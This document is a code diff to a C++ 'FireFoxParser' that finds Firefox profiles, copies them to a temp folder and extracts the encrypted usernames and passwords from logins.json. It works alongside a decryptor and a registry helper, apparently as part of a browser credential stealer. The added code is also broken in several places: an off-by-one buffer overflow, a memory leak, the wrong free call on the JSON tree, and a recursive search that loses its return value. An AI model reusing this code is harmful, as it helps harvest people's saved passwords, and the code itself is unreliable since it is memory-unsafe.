@@ -1,8 +1,7 @@
 ﻿#include "FireFoxParser.h"
 
 #include <iostream>
-#include <json.hpp>
-
+#include "cJson.h"
 #include "FileOperations.h"
 #include "FirefoxDecryptor.h"
 #include "RegEditHelper.h"
@@ -112,13 +111,49 @@ String FireFoxParser::get_profile_dir(const String& dir_localdata)
 String FireFoxParser::get_mozilla_program_dir(const String& temp_dir)
 {
 	const String path_to_ini_file = temp_dir + "\\compatibility.ini";
+	String raw_ini;
+	String path_to_software;
 	
-	IniParser ini_reader;
-	if (!ini_reader.parseFile(path_to_ini_file)) return "";
+	if (!IO::is_file_exists(path_to_ini_file)) return "";
+	if (!IO::read_file(path_to_ini_file, raw_ini)) return "";	
 
 	try
 	{
-		return static_cast<std::string>(ini_reader["Compatibility.LastPlatformDir"]);
+
+		const char* delimiter = "\r\n";
+		char* pch = strtok(const_cast<char*>(raw_ini.c_str()), delimiter);
+
+		while (pch != 0) 
+		{
+			auto sub_path = strstr(pch, "LastPlatformDir=");
+
+			if(sub_path)
+			{
+				
+				int start_index = strlen("LastPlatformDir=");
+				int count = strlen(sub_path) - start_index;
+				char* _temp_path = (char*) malloc(sizeof(char)*count);
+
+
+				for (int i = start_index, index = 0; index < count; i++, index++)
+				{
+					_temp_path[index] = sub_path[i];
+				}
+
+				_temp_path[count] = '\0';				
+
+				
+				path_to_software = _temp_path;
+			}
+
+			pch = strtok(NULL, delimiter);
+		}
+
+
+
+
+		
+		return path_to_software;
 	}
 	catch (...)
 	{
@@ -134,26 +169,50 @@ List<AccountData> FireFoxParser::get_encrypted_data(const String& path_to_json)
 	
 	if (!IO::read_file(path_to_json, data_logins)) return {};
 	
-	auto _json = nlohmann::json::parse(data_logins);
-	if (_json.empty()) return {};
-	if(!_json.contains("logins")) return {};
+	auto json_root = cJSON_Parse(data_logins.c_str());
 
-	for (auto& login_json : _json.at("logins").items())
+	
+	if (const auto logins = find_logins_node(json_root->child, "logins"))
 	{
-		AccountData account;
-		auto login_item = login_json.value();
-		if(login_item.contains("hostname"))		
-			account.Url = login_item.at("hostname").get<std::string>();
 
-		if (login_item.contains("encryptedUsername"))
-			account.Username = login_item.at("encryptedUsername").get<std::string>();
 
-		if (login_item.contains("encryptedPassword"))
-			account.Password = login_item.at("encryptedPassword").get<std::string>();
+		for (int i = 0; i < cJSON_GetArraySize(logins); i++) {
 
-		accounts_data.emplace_back(account);
+			auto account_row = cJSON_GetArrayItem(logins, i);
+			if (!account_row) continue;
+
+			auto count_row = cJSON_GetArraySize(account_row);
+
+			AccountData account_data;
+			for (int row_index = 0; row_index < cJSON_GetArraySize(account_row); row_index++)
+			{
+				auto row = cJSON_GetArrayItem(account_row, row_index);
+				if (!row) continue;
+
+				if (strcmp(row->string, "hostname") == 0)
+				{
+					account_data.Url = cJSON_GetStringValue(row);
+					continue;
+				}
+
+				if (strcmp(row->string, "encryptedUsername") == 0)
+				{
+					account_data.Username = cJSON_GetStringValue(row);
+					continue;
+				}
+
+				if (strcmp(row->string, "encryptedPassword") == 0)
+				{
+					account_data.Password = cJSON_GetStringValue(row);
+					continue;
+				}
+			}
+
+			accounts_data.emplace_back(account_data);
+		}
 	}
-
+	
+	free(json_root);
 
 	return accounts_data;
 }
@@ -190,6 +249,18 @@ bool FireFoxParser::prepare_imports(String profile_dir, String& out_temp_dir)
 
 	
 	return true;
+}
+
+cJSON* FireFoxParser::find_logins_node(cJSON* input_node, const char* pattern)
+{
+	if (!input_node) return nullptr;
+
+	if (strcmp(input_node->string, pattern) == 0)
+	{
+		return input_node;
+	}
+
+	find_logins_node(input_node->next, pattern);
 }
 
 
